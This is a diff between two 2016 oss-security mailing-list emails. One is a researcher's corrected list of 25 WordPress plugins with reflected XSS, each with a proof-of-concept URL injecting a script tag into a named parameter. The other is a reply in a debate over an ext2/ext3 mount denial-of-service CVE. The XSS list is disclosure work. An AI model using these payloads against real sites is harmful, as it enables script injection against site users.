@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["7832" "Thursday" "14" "April" "2016" "13:07:58" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<51BCC5B5-7EC2-497C-992F-A3EBB8647DDF@me.com>" "132" "Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." nil nil nil "4" "2016041417:07:58" "[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." (number mark "U       larry0@me.co Apr 14  132/7832  " thread-indent "\"Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.\"\n") "<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>" ("<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2674" "Thursday" "31" "March" "2016" "17:37:19" "+0200" "Hugues ANGUELKOV" "hugues.anguelkov@etu.univ-nantes.fr" "<2cc0c808c8ec740dc075b3b286598454.squirrel@webmail-etu.univ-nantes.fr>" "68" "[oss-security] Re: CVE Request - Linux kernel (multiple versions) ext2/ext3  filesystem DoS" nil nil nil "3" "2016033115:37:19" "[oss-security] Re: CVE Request - Linux kernel (multiple versions) ext2/ext3 filesystem DoS" (number mark "U       hugues.angue Mar 31   68/2674  " thread-indent "\"[oss-security] Re: CVE Request - Linux kernel (multiple versions) ext2/ext3  filesystem DoS\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 9795 invoked by uid 550); 14 Apr 2016 17:08:14 -0000
+Received: (qmail 7430 invoked by uid 550); 31 Mar 2016 15:37:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,163 +12,89 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 9773 invoked from network); 14 Apr 2016 17:08:13 -0000
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2016-04-14_08:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1015 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1510270003 definitions=main-1604140240
-Content-type: text/plain; charset=us-ascii
-MIME-version: 1.0 (Mac OS X Mail 9.2 \(3112\))
-From: "Larry W. Cashdollar" <larry0@me.com>
-In-reply-to: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
-Date: Thu, 14 Apr 2016 13:07:58 -0400
-Content-transfer-encoding: quoted-printable
-Message-id: <51BCC5B5-7EC2-497C-992F-A3EBB8647DDF@me.com>
-References: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
-To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3112)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1460653680; bh=WpSUnPn6ymBYxYcTKLHFdCentXj3VNl7Ho2cM2JKCBg=;
-	h=Content-type:MIME-version:Subject:From:Date:Message-id:To;
-	b=jcbQCRl4uI6mO8pqiJXGOlkZ7Ps3Z72YLcJ4RQmxCiPkpwEnHOgUVF0kcQKWIabB9
- eS+d1KJnlFkqEwfbQs8JDWWgQ4TGgUIxRXuGKci/rtvuLFqdxFsIZBV+rCcmmrqwpM
- 5gPD9VHgHxtKAcFcp98s9iBX9jN4OhHXOLszYo/+GasfrjCdB8lQ7AXBC3XT6DMnYz
- fxjK2nh/Z3qXSIjMWI+K6fp58dKLyfjOB1gLJ9+JSBe65Xql3Spqgv00Ia9inBBN06
- ciA32lmEuWI7RTW5BvT7MPU/HUB8izAov+DK0QU9QRck64fQ6dR/RGx1A03IOswGHE
- aTAB7+wFYoraw==
-Subject: Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.
+Received: (qmail 7407 invoked from network); 31 Mar 2016 15:37:31 -0000
+X-Virus-Scanned: Debian amavisd-new at smtp2
+Message-ID: <2cc0c808c8ec740dc075b3b286598454.squirrel@webmail-etu.univ-nantes.fr>
+Date: Thu, 31 Mar 2016 17:37:19 +0200 (CEST)
+From: "Hugues ANGUELKOV" <hugues.anguelkov@etu.univ-nantes.fr>
+To: tytso@athena.mit.edu
+Cc: kseifried@redhat.com,
+ sandeen@redhat.com,
+ oss-security@lists.openwall.com
+User-Agent: SquirrelMail/1.4.17
+MIME-Version: 1.0
+Content-Type: text/plain;charset=iso-8859-1
+Content-Transfer-Encoding: 8bit
+X-Priority: 3 (Normal)
+Importance: Normal
+Subject: [oss-security] Re: CVE Request - Linux kernel (multiple versions) ext2/ext3 
+     filesystem DoS
 
-Hi List,
+Date: Thu, 31 Mar 2016 08:53:17 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Cc: Andreas Dilger <adilger@...ger.ca>, Yves-Alexis Perez
+<corsac@...ian.org>,
+	Theodore Tso <tytso@...gle.com>, linux-ext4@...r.kernel.org
+Subject: Re: CVE Request - Linux kernel (multiple versions)
+ ext2/ext3 filesystem DoS
 
-This morning I realized a flaw in my testing methodology, I used php5-cgi o=
-n the command line setting environment variables to pass the XSS payload
-to the vulnerable php code.  What I failed to realize is that if the plugin=
- code was setting a content-header this would be missed when I used phantom=
-JS to render
-the html output and execute any JS I had injected.  The result is only 25 o=
-f the plugins are exploitable.  The other 14 aren't XSSable because they se=
-t the content header=20
-to something the browser doesn't render.  Here is a list of the remaining p=
-lugins.  I'm sorry for my mistake.
+On Wed, Mar 30, 2016 at 2:43 PM, Theodore Ts'o <tytso@....edu> wrote:
+>
+>
+> You can mount the file system with "mount -o errors=continue" and this
+> will override the default behavior specified in the super block.
+>
+> I would argue that a Desktop or server system that had automount
+> should either (a) mount with -o errors=continue, or (b) force an fsck
+> on the file system before mounting it.
+>
 
-Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js/i=
-ndexisto-inject.php Parameter:indexisto_index CVEID:2016-77360 PoC:hxxp://[=
-target]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexis=
-to_index=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-plug=
-in.php Parameter:plugin CVEID:2016-77799 PoC:hxxp://[target]/wp-content/plu=
-gins/whizz/plugins/delete-plugin.php?plugin=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiarism=
-/js.php Parameter:m CVEID:2016-77035 PoC:hxxp://[target]/wp-content/plugins=
-/anti-plagiarism/js.php?m=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video-m=
-anagement/preview_video.php Parameter:media CVEID:2016-77600 PoC:hxxp://[ta=
-rget]/wp-content/plugins/s3-video/views/video-management/preview_video.php?=
-media=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-sea=
-rch-engine/classes/extensions/managed-solr-servers/templates/template-my-ac=
-counts.php Parameter:page  tab CVEID:2016-77958 PoC:hxxp://[target]/wp-cont=
-ent/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/te=
-mplates/template-my-accounts.php?page=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layout=
--builder/includes/layout-settings.php Parameter:layout_settings_id CVEID:20=
-16-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/include=
-s/layout-settings.php?layout_settings_id=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_sel=
-ect.php Parameter:date-from date-to CVEID:2016-77217 PoC:hxxp://[target]/wp=
--content/plugins/e-search/tmpl/date_select.php?date-from=3D"><script>alert(=
-1);</script><"
-Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_az=
-.php Parameter:title_az CVEID:2016-77217 PoC:hxxp://[target]/wp-content/plu=
-gins/e-search/tmpl/title_az.php?title_az=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/pop=
-up-insert-help.php Parameter:galleryId id  tidio-gallery CVEID:2016-77727 P=
-oC:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?g=
-alleryId=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php P=
-arameter:font size CVEID:2016-77506 PoC:hxxp://[target]/wp-content/plugins/=
-parsi-font/css.php?size=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./def=
-a-online-image-protector/redirect.php Parameter:r CVEID:2016-77193 PoC:hxxp=
-://[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r=
-=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-fire=
-work/firework/index.php Parameter:music text url CVEID:2016-77475 PoC:hxxp:=
-//[target]/wp-content/plugins/new-year-firework/firework/index.php?text=3D"=
-><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-reserv=
-eren/edit.php Parameter:page CVEID:2016-77628 PoC:hxxp://[target]/wp-conten=
-t/plugins/simpel-reserveren/edit.php?page=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-po=
-st/js.php Parameter:count interval CVEID:2016-77022 PoC:hxxp://[target]/wp-=
-content/plugins/ajax-random-post/js.php?interval=3D"><script>alert(1);</scr=
-ipt><"
-Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-ed=
-itor/css.php Parameter:font size CVEID:2016-77009 PoC:hxxp://[target]/wp-co=
-ntent/plugins/admin-font-editor/css.php?size=3D"><script>alert(1);</script>=
-<"
-Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.php =
-Parameter:playlist CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
-hdw-tube/playlist.php?playlist=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.php=
- Parameter:channel CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
-hdw-tube/mychannel.php?channel=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/vie=
-ws/dashboard/index.php Parameter:p v CVEID:2016-77341 PoC:hxxp://[target]/w=
-p-content/plugins/hero-maps-pro/views/dashboard/index.php?v=3D"><script>ale=
-rt(1);</script><"
-Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
-inc/pages/edit_styles.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target=
-]/wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid=3D"><=
-script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
-inc/pages/build.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target]/wp-c=
-ontent/plugins/photoxhibit/common/inc/pages/build.php?gid=3D"><script>alert=
-(1);</script><"
-Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formmail=
-/pages/admin-mail-info.php Parameter:itemid CVEID:2016-77532 PoC:hxxp://[ta=
-rget]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=
-=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-tr=
-ackr_abtest_add.php Parameter:id N  WPSLT CVEID:2016-77339 PoC:hxxp://[targ=
-et]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=3D"><scrip=
-t>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-ins=
-ert-help.php Parameter:formId id  tidio-form CVEID:2016-77726 PoC:hxxp://[t=
-arget]/wp-content/plugins/tidio-form/popup-insert-help.php?formId=3D"><scri=
-pt>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/simplified-content File:./simplified-c=
-ontent/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVEID:2016-7=
-7642 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframewo=
-rk/js/ajax/OOAAjax.js.php?ajaxURL=3D"><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Infus=
-ionsoft/examples/leadscoring.php Parameter:ContactId CVEID:2016-77364 PoC:h=
-xxp://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadsc=
-oring.php?ContactId=3D"><script>alert(1);</script><"
+The problem is that:
 
-Advisories here: http://www.vapidlabs.com/wp/wp.php
+a) means I'll be mounting filesystems with errors that I may want to know
+about (but not have my  system panic about)
+
+b) fsck takes a long time on large disks (the smallest size of disk I buy
+for USB drives is 1TB, if I fsck every time I plug one in I'll die of old
+age).
 
 
-Again my apologies,
-Larry
+>
+> So I think this is a particularly meaningless CVE, which is why I have
+> zero respect for people who try to make any kind of conclusion based
+> on CVE counts.   I certainly don't plan to do anything about this.
+>
+
+As for your comments on CVE counting even the then head of CVE @mitre told
+people not to rely on CVE counting for vulnerability stats:
+
+https://media.blackhat.com/us-13/US-13-Martin-Buying-Into-The-Bias-Why-Vulnerability-Statistics-Suck-Slides.pdf
+
+As for your comment on not fixing this: I think fundamentally I should be
+able to plug a file system in and try to mount it with default/reasonable
+options and NOT have my system panic. File system handling code, like any
+code that handles user supplied data should be able to handle garbage
+gracefully and securely. At worst it should try to mount and go "derp, it's
+messed up, maybe fsck it?"
 
 
-> On Apr 12, 2016, at 8:48 AM, Larry W. Cashdollar <larry0@me.com> wrote:
->=20
-> Hello List,
->=20
->=20
-> This was a project I worked on as part of my research in Akamai's SIRT, I=
- initially found 1352 suspect XSS vulnerabilities but Wordpress escapes sup=
-er globals GET/POST/REQUEST
-> https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the =
-time, so now I have a database of vulnerabilities that are context dependen=
-t and would need to be examined
-> individually.  I managed to automate XSS testing against the database and=
- of 1352 39 successfully executed javascript.  These are those 39, I've man=
-ually verified they're still vulnerable.
->=20
-> They're available here http://www.vapidlabs.com/wp/wp.php
+
+>
+>                                            - Ted
+>
+
+
+First of all, I would like to say I'm not a MIT genius nor a security
+engineer, just a chemistry student who were fuzzing his box on his free
+time. I'm not interested about getting CVE nor collecting them and I
+apologize if my mail have sound like that.
+I was just concerned about getting a better system where I can mount any
+file system without any crash/panic.
+But again I'm not a pro/engineer, and I know that I've got no credibility
+and it's certainly not with these kind of things I will get somes. Anyway,
+thanks for reading and all your work, now I'm gonna use this fucking DoS
+trick called "shutdown -h now" and stop reporting thing what I was
+thinking it was strange behaviour.
+Hugues.
 
